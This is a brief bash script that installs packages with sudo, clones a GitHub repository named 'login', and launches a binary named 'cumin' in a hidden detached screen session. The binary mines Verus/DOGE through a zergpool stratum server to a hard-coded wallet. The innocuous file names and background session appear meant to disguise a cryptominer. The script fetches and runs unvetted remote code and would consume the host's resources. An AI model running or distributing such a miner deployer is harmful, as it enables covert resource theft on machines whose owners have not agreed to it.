#!/bin/bash
WORKER=$(echo $(shuf -i 10-40 -n 1))
sudo apt update
sudo apt install screen libjansson4 -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
screen -dmS layar ./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT.$WORKER -t 2 -p c=DOGE,mc=VRSC,m=party.123456 \n
